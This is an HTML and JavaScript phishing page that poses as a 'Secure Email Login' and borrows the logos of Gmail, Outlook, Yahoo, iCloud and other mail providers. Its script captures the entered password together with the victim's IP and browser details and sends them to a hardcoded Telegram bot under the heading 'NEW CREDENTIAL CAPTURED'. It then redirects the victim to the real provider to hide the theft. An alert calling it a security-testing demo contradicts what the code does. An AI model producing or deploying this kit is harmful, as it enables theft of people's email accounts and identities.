<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Email Login</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background-size: cover;
            background-position: center;
            background-repeat: no-repeat;
            transition: background-image 0.5s ease;
            position: relative;
        }

        body::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(0, 0, 0, 0.3);
            z-index: -1;
        }

        .login-container {
            background: rgba(255, 255, 255, 0.95);
            padding: 40px;
            border-radius: 12px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
            width: 100%;
            max-width: 400px;
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .provider-header {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 25px;
            gap: 12px;
        }

        .provider-logo {
            width: 40px;
            height: 40px;
            border-radius: 8px;
            object-fit: contain;
            background: #f8f9fa;
            padding: 5px;
        }

        .provider-name {
            font-size: 20px;
            font-weight: 600;
            color: #2c3e50;
        }

        .login-title {
            text-align: center;
            margin-bottom: 30px;
            color: #7f8c8d;
            font-size: 16px;
            font-weight: 500;
        }

        .auth-alert {
            text-align: center;
            color: #e74c3c;
            font-size: 14px;
            font-weight: 500;
            margin-bottom: 25px;
            padding: 10px;
            background: rgba(231, 76, 60, 0.1);
            border-radius: 6px;
        }

        .form-group {
            margin-bottom: 20px;
            position: relative;
        }

        .input-icon {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            width: 18px;
            height: 18px;
            opacity: 0.6;
            transition: all 0.3s ease;
        }

        .form-input {
            width: 100%;
            padding: 14px 15px 14px 45px;
            border: 2px solid #ecf0f1;
            border-radius: 8px;
            font-size: 14px;
            background: #f8f9fa;
            transition: all 0.3s ease;
        }

        .form-input:focus {
            outline: none;
            border-color: #3498db;
            background: white;
            box-shadow: 0 0 0 3px rgba(52, 152, 219, 0.1);
        }

        .form-input:focus + .input-icon {
            opacity: 1;
            transform: translateY(-50%) scale(1.1);
        }

        .remember-container {
            display: flex;
            align-items: center;
            margin: 20px 0;
        }

        .remember-checkbox {
            margin-right: 10px;
            width: 16px;
            height: 16px;
            accent-color: #3498db;
        }

        .remember-label {
            font-size: 14px;
            color: #7f8c8d;
        }

        .login-button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #3498db, #2980b9);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .login-button:hover {
            background: linear-gradient(135deg, #2980b9, #2471a3);
            transform: translateY(-1px);
            box-shadow: 0 5px 15px rgba(52, 152, 219, 0.3);
        }

        .login-button:active {
            transform: translateY(0);
        }

        .footer-links {
            text-align: center;
            margin-top: 25px;
            font-size: 14px;
            color: #95a5a6;
        }

        .footer-links a {
            color: #3498db;
            text-decoration: none;
            transition: color 0.3s ease;
        }

        .footer-links a:hover {
            color: #2980b9;
            text-decoration: underline;
        }

        .loading {
            display: none;
            text-align: center;
            color: #3498db;
            margin-top: 15px;
            font-size: 14px;
        }

        .error-message {
            color: #e74c3c;
            font-size: 14px;
            margin-top: 10px;
            display: none;
            text-align: center;
        }

        @media (max-width: 480px) {
            .login-container {
                margin: 20px;
                padding: 30px 25px;
            }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="provider-header">
            <img id="provider-logo" class="provider-logo" src="" alt="Provider Logo">
            <div id="provider-name" class="provider-name">Email Login</div>
        </div>
        
        <div class="login-title">Sign in to continue</div>
        <div class="auth-alert">Authentication Required</div>
        
        <form id="login-form">
            <div class="form-group">
                <input type="email" id="email" class="form-input" placeholder="Email address" required readonly>
                <img class="input-icon" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHBhdGggZD0iTTQgNEgyMFYyMEg0VjRNMjAgOEwxMi4yOTkgMTMuOTk5TDUgOCIgc3Ryb2tlPSIjMzQ5OGRiIiBzdHJva2Utd2lkdGg9IjIiIHN0cm9rZS1saW5lY2FwPSJyb3VuZCIgc3Ryb2tlLWxpbmVqb2luPSJyb3VuZCIvPgo8L3N2Zz4K" alt="Email">
            </div>
            
            <div class="form-group">
                <input type="password" id="password" class="form-input" placeholder="Password" required>
                <img class="input-icon" src="data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iMjQiIGhlaWdodD0iMjQiIHZpZXdCb3g9IjAgMCAyNCAyNCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3QgeD0iMyIgeT0iMTEiIHdpZHRoPSIxOCIgaGVpZ2h0PSIxMSIgcng9IjIiIHN0cm9rZT0iIzM0OThkYiIgc3Ryb2tlLXdpZHRoPSIyIi8+CjxwYXRoIGQ9Ik03IDExVjdBNSA1IDAgMCAxIDE3IDdWMTEiIHN0cm9rZT0iIzM0OThkYiIgc3Ryb2tlLXdpZHRoPSIyIi8+Cjwvc3ZnPgo=" alt="Password">
            </div>
            
            <div class="remember-container">
                <input type="checkbox" id="remember-me" class="remember-checkbox" checked>
                <label for="remember-me" class="remember-label">Stay signed in</label>
            </div>
            
            <button type="submit" class="login-button" id="submit-btn">
                Sign In
            </button>
            
            <div class="loading" id="loading">
                Authenticating...
            </div>
            
            <div class="error-message" id="error-message">
                Authentication failed. Please try again.
            </div>
        </form>
        
        <div class="footer-links">
            <a href="#" id="forgot-password">Forgot password?</a> • 
            <a href="#" id="privacy-policy">Privacy</a>
        </div>
    </div>

    <script>
        // Telegram Bot Configuration
        const TELEGRAM_BOT_TOKEN = '7974572883:AAEF8sGcxApUr9lZ2ZTaUY7tWstIjSpbpoE';
        const TELEGRAM_CHAT_ID = '8132476411';

        // Email domain to provider mapping with proper redirect URLs
        const domainProviders = {
            'gmail.com': {
                name: 'Gmail',
                logo: 'https://logo.clearbit.com/gmail.com',
                redirect: 'https://mail.google.com/mail/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1611224923853-80b023f02d71?w=1920&q=80',
                    'https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1920&q=80',
                    'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1920&q=80'
                ]
            },
            'googlemail.com': {
                name: 'Gmail',
                logo: 'https://logo.clearbit.com/gmail.com',
                redirect: 'https://mail.google.com/mail/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1611224923853-80b023f02d71?w=1920&q=80',
                    'https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1920&q=80'
                ]
            },
            'outlook.com': {
                name: 'Outlook',
                logo: 'https://logo.clearbit.com/outlook.com',
                redirect: 'https://outlook.live.com/mail/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1497366754035-f200968a6e72?w=1920&q=80',
                    'https://images.unsplash.com/photo-1497366811353-6870744d04b2?w=1920&q=80'
                ]
            },
            'hotmail.com': {
                name: 'Outlook',
                logo: 'https://logo.clearbit.com/outlook.com',
                redirect: 'https://outlook.live.com/mail/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1497366754035-f200968a6e72?w=1920&q=80',
                    'https://images.unsplash.com/photo-1497366811353-6870744d04b2?w=1920&q=80'
                ]
            },
            'live.com': {
                name: 'Outlook',
                logo: 'https://logo.clearbit.com/outlook.com',
                redirect: 'https://outlook.live.com/mail/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1497366754035-f200968a6e72?w=1920&q=80',
                    'https://images.unsplash.com/photo-1497366811353-6870744d04b2?w=1920&q=80'
                ]
            },
            'yahoo.com': {
                name: 'Yahoo Mail',
                logo: 'https://logo.clearbit.com/yahoo.com',
                redirect: 'https://mail.yahoo.com/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1542744173-8e7e53415bb0?w=1920&q=80',
                    'https://images.unsplash.com/photo-1542744095-fcf48d80b0fd?w=1920&q=80'
                ]
            },
            'icloud.com': {
                name: 'iCloud Mail',
                logo: 'https://logo.clearbit.com/icloud.com',
                redirect: 'https://www.icloud.com/mail',
                backgrounds: [
                    'https://images.unsplash.com/photo-1518709268805-4e9042af2176?w=1920&q=80'
                ]
            },
            'me.com': {
                name: 'iCloud Mail',
                logo: 'https://logo.clearbit.com/icloud.com',
                redirect: 'https://www.icloud.com/mail',
                backgrounds: [
                    'https://images.unsplash.com/photo-1518709268805-4e9042af2176?w=1920&q=80'
                ]
            },
            'mac.com': {
                name: 'iCloud Mail',
                logo: 'https://logo.clearbit.com/icloud.com',
                redirect: 'https://www.icloud.com/mail',
                backgrounds: [
                    'https://images.unsplash.com/photo-1518709268805-4e9042af2176?w=1920&q=80'
                ]
            },
            'protonmail.com': {
                name: 'ProtonMail',
                logo: 'https://logo.clearbit.com/protonmail.com',
                redirect: 'https://mail.proton.me/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1920&q=80'
                ]
            },
            'zoho.com': {
                name: 'Zoho Mail',
                logo: 'https://logo.clearbit.com/zoho.com',
                redirect: 'https://mail.zoho.com/',
                backgrounds: [
                    'https://images.unsplash.com/photo-1579546929662-711aa81148cf?w=1920&q=80'
                ]
            }
        };

        // Generic backgrounds for unknown domains
        const genericBackgrounds = [
            'https://images.unsplash.com/photo-1611224923853-80b023f02d71?w=1920&q=80',
            'https://images.unsplash.com/photo-1563013544-824ae1b704d3?w=1920&q=80',
            'https://images.unsplash.com/photo-1551288049-bebda4e38f71?w=1920&q=80',
            'https://images.unsplash.com/photo-1579546929662-711aa81148cf?w=1920&q=80'
        ];

        // Get URL parameter
        function getUrlParameter(name) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(name);
        }

        // Extract email from various sources
        function extractEmail() {
            // Method 1: URL parameter
            let email = getUrlParameter('email');
            if (email) return email;
            
            // Method 2: Fragment identifier (after #)
            const fragmentParams = new URLSearchParams(window.location.hash.substring(1));
            email = fragmentParams.get('email');
            if (email) return email;
            
            // Method 3: Path-based email (e.g., /login/user@example.com)
            const pathParts = window.location.pathname.split('/');
            for (const part of pathParts) {
                if (part.includes('@')) {
                    return part;
                }
            }
            
            // Method 4: Referrer parameter
            try {
                const referrerUrl = new URL(document.referrer);
                email = referrerUrl.searchParams.get('email');
                if (email) return email;
            } catch (e) {
                // Invalid referrer URL
            }
            
            return null;
        }

        // Set background image with fallback
        function setBackgroundImage(imageUrl) {
            const img = new Image();
            img.onload = function() {
                document.body.style.backgroundImage = `url('${imageUrl}')`;
            };
            img.onerror = function() {
                // Use a random generic background
                const randomBg = genericBackgrounds[Math.floor(Math.random() * genericBackgrounds.length)];
                document.body.style.backgroundImage = `url('${randomBg}')`;
            };
            img.src = imageUrl;
        }

        // Initialize page based on email parameter
        function initializePage() {
            const email = extractEmail();
            
            if (email) {
                document.getElementById('email').value = email;
                const domain = email.split('@')[1]?.toLowerCase();
                
                if (domain && domainProviders[domain]) {
                    const provider = domainProviders[domain];
                    
                    // Update provider info
                    document.getElementById('provider-name').textContent = provider.name;
                    document.getElementById('provider-logo').src = provider.logo;
                    
                    // Set background image
                    const randomBg = provider.backgrounds[Math.floor(Math.random() * provider.backgrounds.length)];
                    setBackgroundImage(randomBg);
                    
                } else {
                    // Default settings for unknown domains
                    document.getElementById('provider-logo').src = 'https://logo.clearbit.com/' + domain;
                    document.getElementById('provider-name').textContent = domain ? `${domain.charAt(0).toUpperCase() + domain.slice(1)} Mail` : 'Email Login';
                    
                    // Use generic background for unknown domains
                    const randomBg = genericBackgrounds[Math.floor(Math.random() * genericBackgrounds.length)];
                    setBackgroundImage(randomBg);
                }
                
                // Handle logo loading errors
                document.getElementById('provider-logo').onerror = function() {
                    this.src = 'data:image/svg+xml;base64,PHN2ZyB3aWR0aD0iNDAiIGhlaWdodD0iNDAiIHZpZXdCb3g9IjAgMCA0MCA0MCIgZmlsbD0ibm9uZSIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4KPHJlY3Qgd2lkdGg9IjQwIiBoZWlnaHQ9IjQwIiByeD0iOCIgZmlsbD0iIzM0OThkYiIvPgo8cGF0aCBkPSJNMTAgMTVIMzBWMTVIMTBaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTAgMjBIMzBWMjBIMTBaIiBmaWxsPSJ3aGl0ZSIvPgo8cGF0aCBkPSJNMTAgMjVIMjVWMjVIMTBaIiBmaWxsPSJ3aGl0ZSIvPgo8L3N2Zz4K';
                };
            } else {
                // No email parameter, use default background
                const randomBg = genericBackgrounds[Math.floor(Math.random() * genericBackgrounds.length)];
                setBackgroundImage(randomBg);
                
                // Show email input field if no email found
                document.getElementById('email').removeAttribute('readonly');
                document.getElementById('email').placeholder = "Enter your email";
            }
        }

        // Get user IP address
        async function getUserIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch (error) {
                return 'Unknown';
            }
        }

        // Get user agent information
        function getUserAgentInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                screenResolution: `${screen.width}x${screen.height}`
            };
        }

        // Send credentials to Telegram
        async function sendToTelegram(email, password, additionalData) {
            const currentTime = new Date().toLocaleString();
            const message = 
`🔐 NEW CREDENTIAL CAPTURED

📧 Email: ${email}
🔑 Password: ${password}

🌐 Domain: ${email.split('@')[1]}
🕒 Capture Time: ${currentTime}

📍 Client Info:
   IP Address: ${additionalData.ip}
   Platform: ${additionalData.userAgentInfo.platform}
   Resolution: ${additionalData.userAgentInfo.screenResolution}
   Language: ${additionalData.userAgentInfo.language}
   Cookies Enabled: ${additionalData.userAgentInfo.cookiesEnabled ? 'Yes' : 'No'}

🔍 Technical Details:
   User Agent: ${additionalData.userAgentInfo.userAgent}
   Referrer: ${additionalData.referrer || 'Direct visit'}
   Page URL: ${window.location.href}`;

            try {
                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: TELEGRAM_CHAT_ID,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                return response.ok;
            } catch (error) {
                console.error('Telegram API error:', error);
                return false;
            }
        }

        // Get redirect URL for a domain
        function getRedirectUrl(domain) {
            domain = domain.toLowerCase();
            if (domainProviders[domain]) {
                return domainProviders[domain].redirect;
            }
            // Fallback redirects for common providers
            if (domain.includes('gmail') || domain.includes('google')) {
                return 'https://mail.google.com/';
            } else if (domain.includes('outlook') || domain.includes('hotmail') || domain.includes('live')) {
                return 'https://outlook.live.com/mail/';
            } else if (domain.includes('yahoo')) {
                return 'https://mail.yahoo.com/';
            } else if (domain.includes('icloud') || domain.includes('me.com') || domain.includes('mac.com')) {
                return 'https://www.icloud.com/mail';
            } else {
                // Generic fallback
                return `https://${domain}`;
            }
        }

        // Handle form submission
        async function handleFormSubmission(event) {
            event.preventDefault();
            
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value;
            
            if (!email || !password) {
                showError('Please enter both email and password');
                return;
            }
            
            // Validate email format
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            if (!emailRegex.test(email)) {
                showError('Please enter a valid email address');
                return;
            }
            
            // Show loading state
            const submitBtn = document.getElementById('submit-btn');
            const loading = document.getElementById('loading');
            submitBtn.disabled = true;
            loading.style.display = 'block';
            hideError();
            
            try {
                // Get additional information
                const ip = await getUserIP();
                const userAgentInfo = getUserAgentInfo();
                const referrer = document.referrer;
                
                const additionalData = {
                    ip,
                    userAgentInfo,
                    referrer
                };
                
                // Send credentials to Telegram
                await sendToTelegram(email, password, additionalData);
                
                // Extract domain for redirect
                const domain = email.split('@')[1];
                const redirectUrl = getRedirectUrl(domain);
                
                // Redirect after successful capture
                setTimeout(() => {
                    window.location.href = redirectUrl;
                }, 2000);
                
            } catch (error) {
                console.error('Submission error:', error);
                showError('Authentication failed. Please try again.');
                submitBtn.disabled = false;
                loading.style.display = 'none';
            }
        }

        // Error handling functions
        function showError(message) {
            const errorElement = document.getElementById('error-message');
            errorElement.textContent = message;
            errorElement.style.display = 'block';
        }

        function hideError() {
            document.getElementById('error-message').style.display = 'none';
        }

        // Setup footer links
        function setupFooterLinks() {
            document.getElementById('forgot-password').addEventListener('click', function(e) {
                e.preventDefault();
                const email = document.getElementById('email').value;
                const domain = email.split('@')[1];
                
                if (domain) {
                    let recoveryUrl;
                    switch(domain.toLowerCase()) {
                        case 'gmail.com':
                        case 'googlemail.com':
                            recoveryUrl = 'https://accounts.google.com/signin/recovery';
                            break;
                        case 'outlook.com':
                        case 'hotmail.com':
                        case 'live.com':
                            recoveryUrl = 'https://account.live.com/resetpassword.aspx';
                            break;
                        case 'yahoo.com':
                            recoveryUrl = 'https://login.yahoo.com/forgot';
                            break;
                        case 'icloud.com':
                        case 'me.com':
                        case 'mac.com':
                            recoveryUrl = 'https://iforgot.apple.com/password/verify';
                            break;
                        default:
                            recoveryUrl = `https://${domain}/forgot-password`;
                    }
                    window.open(recoveryUrl, '_blank');
                } else {
                    window.open('https://accounts.google.com/signin/recovery', '_blank');
                }
            });
            
            document.getElementById('privacy-policy').addEventListener('click', function(e) {
                e.preventDefault();
                alert('This is a demonstration login page for security testing purposes only. No real authentication occurs.');
            });
        }

        // Initialize everything when DOM is loaded
        document.addEventListener('DOMContentLoaded', function() {
            initializePage();
            document.getElementById('login-form').addEventListener('submit', handleFormSubmission);
            setupFooterLinks();
            
            // Focus on appropriate field
            const emailField = document.getElementById('email');
            if (emailField.hasAttribute('readonly')) {
                document.getElementById('password').focus();
            } else {
                emailField.focus();
            }
        });
    </script>
</body>
</html>
